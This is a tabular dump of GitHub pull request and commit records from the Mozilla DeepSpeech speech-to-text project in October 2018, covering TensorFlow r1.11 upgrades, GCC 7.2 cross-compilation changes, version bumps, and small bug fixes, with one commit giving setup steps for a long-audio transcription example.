2799,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1641,1641,Bump to v0.3.0-alpha.0,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-10-11T16:04:25Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,76691e0c42e14314af079871f63e2def1be38d6a,"Bump to v0.3.0-alpha.0

X-DeepSpeech: NOBUILD"
2800,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0cbe05047c091ad3fa0251fb6dfda14c64edd25d,Use GCC --sysroot
2801,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b420992b00a87fb2d9739d31822e0c1a14fc15d0,"Merge pull request #1631 from lissyx/use-sysroot

Use GCC --sysroot"
2802,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5c188c5142196200cda69d3945af45f217b4a70,Cleanup and move Python binding in subdir
2803,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,59a9dd96006995083da3cbe3f518a2a9a28d7f7b,"Merge pull request #1633 from lissyx/cleanup-py

Cleanup and move Python binding in subdir"
2804,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,baf962471493da2742dd15eafda8d4b6c9073936,setup training_speech importer (see #1576)
2805,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f009ad09f7d0a510b2c94aed128c7328a63a20fe,"Merge pull request #1599 from nicolaspanel/master

setup training_speech importer (see #1576)"
2806,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a093848d16c83278d345ec56566674523dee6da1,Switch to GCC7.2 for ARMv7 and ARM64
2807,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fd9a311f1b0223340ca7ac623082927cb41538ba,Update TensorFlow r1.11
2808,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de864a2c6bf26d0cc0ab7c16ef4c46511a5edf07,"Merge pull request #1628 from lissyx/r1.11-gcc72

GCC7.2"
2809,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,76691e0c42e14314af079871f63e2def1be38d6a,"Bump to v0.3.0-alpha.0

X-DeepSpeech: NOBUILD"
2810,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d319dda2ed2d6b897ac6edc2e3fd69d46332c021,"Merge pull request #1641 from lissyx/bump-v0.3.0-alpha.0

Bump to v0.3.0-alpha.0"
2811,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,59325e99741940da0afe38d390b316e374ff3e52,Merge remote-tracking branch 'upstream/master' into update-tf-master
2812,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97f54a9167932a24237befefa814cd0b4ca7a665,Statically link libstdc++ for ABI portability
2813,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1640,1640,Update tf master,,lissyx,1645737,2018-10-11T16:01:46Z,COLLABORATOR,True,186,59,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8744852b41d16bf9be29644fade5cb78e8178acf,Switch to new master TensorFlow artifacts
2814,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1639,1639,Fixed #1638 (Update Hyperparameters for 0.3.0),,kdavis-mozilla,12054740,2018-10-11T10:24:16Z,CONTRIBUTOR,True,24,20,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c38dc099d36fd593c0ff27e475014bf72a32c94e,Fixed #1638 (Update Hyperparameters for 0.3.0)
2815,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1636,1636,R1.11 gcc72 armbian buster 20180831,,lissyx,1645737,2018-10-09T16:32:39Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c653a0f9a344f5424ae93d84bb27c8686b26b55e,WIP: GCC7.2
2816,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1636,1636,R1.11 gcc72 armbian buster 20180831,,lissyx,1645737,2018-10-09T16:32:39Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05117bffde42bb491f0320141a63178adf7fb5a2,Hack GCC 7.2
2817,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1636,1636,R1.11 gcc72 armbian buster 20180831,,lissyx,1645737,2018-10-09T16:32:39Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3cd2667190758eae5e9f32147025d7236863fe6d,Update TensorFlow Expected
2818,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1636,1636,R1.11 gcc72 armbian buster 20180831,,lissyx,1645737,2018-10-09T16:32:39Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,40d6578907a947854c398d518d21b125b5bbedee,Switch to temp TensorFlow artifacts
2819,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1636,1636,R1.11 gcc72 armbian buster 20180831,,lissyx,1645737,2018-10-09T16:32:39Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b3418b3c77cbee670a599e4aa9590377633499e0,WIP: ARMbian64/Buster/20180831
2820,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1636,1636,R1.11 gcc72 armbian buster 20180831,,lissyx,1645737,2018-10-09T16:32:39Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6607b58a2e8228f3c4b0bb92dcbeb99ccc7172a4,tf
2821,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1635,1635,R1.11 gcc72 armbian stretch 20180831,,lissyx,1645737,2018-10-09T16:30:03Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c653a0f9a344f5424ae93d84bb27c8686b26b55e,WIP: GCC7.2
2822,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1635,1635,R1.11 gcc72 armbian stretch 20180831,,lissyx,1645737,2018-10-09T16:30:03Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05117bffde42bb491f0320141a63178adf7fb5a2,Hack GCC 7.2
2823,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1635,1635,R1.11 gcc72 armbian stretch 20180831,,lissyx,1645737,2018-10-09T16:30:03Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3cd2667190758eae5e9f32147025d7236863fe6d,Update TensorFlow Expected
2824,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1635,1635,R1.11 gcc72 armbian stretch 20180831,,lissyx,1645737,2018-10-09T16:30:03Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,40d6578907a947854c398d518d21b125b5bbedee,Switch to temp TensorFlow artifacts
2825,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1635,1635,R1.11 gcc72 armbian stretch 20180831,,lissyx,1645737,2018-10-09T16:30:03Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b7c8abf209965bafbb060b7470a8ee2f44e68f5b,WIP: ARMbian64/Stretch/20180831
2826,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1635,1635,R1.11 gcc72 armbian stretch 20180831,,lissyx,1645737,2018-10-09T16:30:03Z,COLLABORATOR,False,46,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af5f7280b97730c6f7de8d75e83c9410daa7a1db,tf
2827,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1633,1633,Cleanup and move Python binding in subdir,,lissyx,1645737,2018-10-09T09:58:08Z,COLLABORATOR,True,35,31,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5c188c5142196200cda69d3945af45f217b4a70,Cleanup and move Python binding in subdir
2828,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1631,1631,Use GCC --sysroot,,lissyx,1645737,2018-10-08T14:47:07Z,COLLABORATOR,True,6,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0cbe05047c091ad3fa0251fb6dfda14c64edd25d,Use GCC --sysroot
2829,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1628,1628,GCC7.2,,lissyx,1645737,2018-10-05T14:22:53Z,COLLABORATOR,True,29,21,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a093848d16c83278d345ec56566674523dee6da1,Switch to GCC7.2 for ARMv7 and ARM64
2830,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1628,1628,GCC7.2,,lissyx,1645737,2018-10-05T14:22:53Z,COLLABORATOR,True,29,21,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fd9a311f1b0223340ca7ac623082927cb41538ba,Update TensorFlow r1.11
2831,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1627,1627,Tf master 20181004,,lissyx,1645737,2018-10-04T16:20:41Z,COLLABORATOR,True,44,41,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4dd5396571d706dafe4439c230ed234d2823d8cb,"Fix errors with uninitialized update_progressbar() field
There are multiple paths that could lead to trying to read
update_progressbar.pbar without ever calling
update_progressbar(), but they already check for None."
2832,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1627,1627,Tf master 20181004,,lissyx,1645737,2018-10-04T16:20:41Z,COLLABORATOR,True,44,41,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e746c50c28e88731a249d6604cea5388a1aaf167,"Merge pull request #1626 from daanzu/pr-pbar

Fix errors with uninitialized update_progressbar() field"
2833,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1627,1627,Tf master 20181004,,lissyx,1645737,2018-10-04T16:20:41Z,COLLABORATOR,True,44,41,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c9a35dc1aa90bf8ab7a37b0855d3cef5c23eb5c,Merge remote-tracking branch 'upstream/master' into HEAD
2834,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1627,1627,Tf master 20181004,,lissyx,1645737,2018-10-04T16:20:41Z,COLLABORATOR,True,44,41,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,db07f2489fccf287ad9c20ec6f4beb957d9c3288,Rename GPU to CUDA
2835,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1627,1627,Tf master 20181004,,lissyx,1645737,2018-10-04T16:20:41Z,COLLABORATOR,True,44,41,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2319f95bbbd1712c9745d18c6b484641e4f02439,TensorFlow
2836,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1626,1626,Fix errors with uninitialized update_progressbar() field,"There are multiple paths that could lead to trying to read `update_progressbar.pbar` without ever calling `update_progressbar()`, but they already check for `None`.",daanzu,4319503,2018-10-04T12:17:33Z,CONTRIBUTOR,True,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4dd5396571d706dafe4439c230ed234d2823d8cb,"Fix errors with uninitialized update_progressbar() field
There are multiple paths that could lead to trying to read
update_progressbar.pbar without ever calling
update_progressbar(), but they already check for None."
2837,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1625,1625,Update tf master,,lissyx,1645737,2018-10-04T11:46:35Z,COLLABORATOR,True,627,7,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89620bc448c3548c8e12591cc24f7a543a8c7a0b,"Transcribing longer audio clips

Prerequisites
-------------
~/Deepspeech$ sudo apt install virtualenv
~/Deepspeech$ cd examples/vad_transcriber
~/Deepspeech/examples/vad_transcriber$ virtualenv -p python3 venv
~/Deepspeech/examples/vad_transcriber$ source venv/bin/activate
(venv) ~/Deepspeech/examples/vad_transcriber$ pip3 install -r requirements.txt

Command line tool
-----------------
The command line tool processes a wav file of any duration and returns a trancript
which will the saved in the same directory as the input audio file.

(venv) ~/Deepspeech/examples/vad_transcriber
$ python3 audioTranscript_cmd.py --aggressive 1 --audio ./audio/guido-van-rossum.wav --model ./models/0.2.0/

Minimalistic GUI
----------------
The GUI tool does the same job as the CLI tool. The VAD is fixed at an aggressiveness of 1.
The output is displayed in the transcription window and saved into the directory as the input
audio file as well.

(venv) ~/Deepspeech/examples/vad_transcriber
$ python3 audioTranscript_gui.py

Changes(v1):
1. Using Deepspeech python module instead of subprocess
2. Moved VAD code to a module
3. Moved all files to bin/ and renamed README.md to Audio_Transcription.md

Changes(v2):
Renamed files

Changes (v2.1):
1. Refactoring between CMD and GUI code
2. Documenting pre-requisites with a virtualenv
3. Loading model only once per long wav file
4. CMD and GUI tool do the same job, perform VAD and consolidate the output.
5. Chunks are not saved in the disk. Using a numpy interger array to store them.

Changes (v2.2):
1. Argparse module for command line arguments
2. Everything in virtualenv, with a requirements.txt
3. Older APIs aligned with 0.2.0 release
4. Moved all files into examples/vad_transcriber

Changes (v2.3)
1. Updated requirements.txt"
2838,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1625,1625,Update tf master,,lissyx,1645737,2018-10-04T11:46:35Z,COLLABORATOR,True,627,7,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de54619ac59b1310c96dc548cc21fe4ffb6a03d1,"Merge pull request #1527 from b-ak/master

Transcribing longer audio clips"
2839,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1625,1625,Update tf master,,lissyx,1645737,2018-10-04T11:46:35Z,COLLABORATOR,True,627,7,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1d559355ab71b763eefaa5318dfbd10a585438b,Remove WarpCTC
2840,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1625,1625,Update tf master,,lissyx,1645737,2018-10-04T11:46:35Z,COLLABORATOR,True,627,7,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4d064b2fe3fd7c5ec7c99f8adda98a59989f03b,"Merge pull request #1623 from lissyx/remove-warpctc

Remove WarpCTC"
2841,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1625,1625,Update tf master,,lissyx,1645737,2018-10-04T11:46:35Z,COLLABORATOR,True,627,7,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,593445d61a8d693ea3d1dbc5051e04949d57b57d,Merge remote-tracking branch 'upstream/master' into update-tf-master
2842,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1623,1623,Remove WarpCTC,,lissyx,1645737,2018-10-03T08:20:46Z,COLLABORATOR,True,2,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1d559355ab71b763eefaa5318dfbd10a585438b,Remove WarpCTC
2843,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1e0945e43025898e1b67f0d7aae474afb4a0dd7b,Update to TensorFlow r1.11
2844,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3dacc8ce90bef2fd99dfef77c9cb88fea3af38e,"Merge pull request #1577 from lissyx/tf-r1.11

Tf r1.11"
2845,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34564ad48c2da3337f05a57fc9798a6e73819b71,Move remaining TensorFlow r1.6 to r1.11
2846,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8a5a0009c1772928a180ae48bd90e19acc2049e9,"Merge pull request #1589 from lissyx/move-1.11

Move remaining TensorFlow r1.6 to r1.11"
2847,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6cf456fdb1f3b781a73322c4af6dbc64538f0636,Adding TaskCluster testing of docker build
2848,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0a9415ee98d786b6c3b6c65ac488f02d0257fb6,Update Dockerfile to TensorFlow r1.11
2849,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1eb176bf503b98e12d4bc504498ca123cd39a8e1,Move to upstream TensorFlow for Docker
2850,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1385cf6f9b7333f835053e27e6825db26b2be3b4,"Merge pull request #1582 from lissyx/update-dockerfile

Adding TaskCluster testing of docker build"
2851,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7fd98fc9bdfbbcaefb5f8f7fa9a15c0462ed4803,Bump to v0.2.1-alpha.0
2852,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e17105fa2f66f4167e6e0c6d23a11c1f85ca0ec0,"Merge pull request #1591 from lissyx/bump-v0.2.1-alpha.0

Bump to v0.2.1-alpha.0"
2853,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1362b50bfbf2b51423a9fbcad40e161a002a53b3,"Enforce same sox options as libsox for C++ client

Fixes #1594"
2854,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,15465765a95c32e4e6c3b87b33ce540177edb8c9,"Merge pull request #1595 from lissyx/fix-nodejs-python-prod

Enforce same sox options as libsox for C++ client"
2855,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff470eab5ba7cb9d952c7a5323005de8d1754e17,Bump to v0.2.1-alpha.1
2856,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae2cfe050a43d5126cec56bfc4b7a9899a6bdba0,"Merge pull request #1596 from lissyx/bump-v0.2.1-alpha.1

Bump to v0.2.1-alpha.1"
2857,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e1d7d004b300da96defd105885e94e52f1fc463,Fixed mismatched array new and delete
2858,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e67dcdbfc6cbf4d449d322b3ba1ad4521f31d29,"Merge pull request #1600 from mozilla/issue1563

Fixed a mismatched array new and delete"
2859,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25ed3cb31e2227bf68650a9fc27059e377bf89a9,"Fix missing field in struct copy

Fixes #1602, #1563"
2860,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63529387e3b70d06a7fb304dec83a4ae6393a052,"Merge pull request #1603 from lissyx/fix-missing-copy

Fix missing field in struct copy"
2861,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6d0ef5794670baf7b5a8d9e43c615c7452567c78,Switch to stable TensorFlow r1.11
2862,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,72eaa2e8cea0c4c4412f8cd10c17b78a0bb3ae95,"Merge pull request #1604 from lissyx/r1.11-final

Switch to stable TensorFlow r1.11"
2863,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c5e031b1f5863da158e864bbb35383bb20130c7,Change TRIE format
2864,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f62bec6fb7763af13c53fb6d14b37936dc017cf,"Merge pull request #1610 from lissyx/trie-opt

Change TRIE format"
2865,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1620,1620,Update tf master,,lissyx,1645737,2018-10-02T18:11:39Z,COLLABORATOR,True,376,102,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94b8c5c1a3efefc0049264eae62ed4b9e6d2d503,"Remove deprecased tensorflow.contrib.learn.python.learn.datasets.base.maybe_download

Fixes #1531
Fixes #1477"
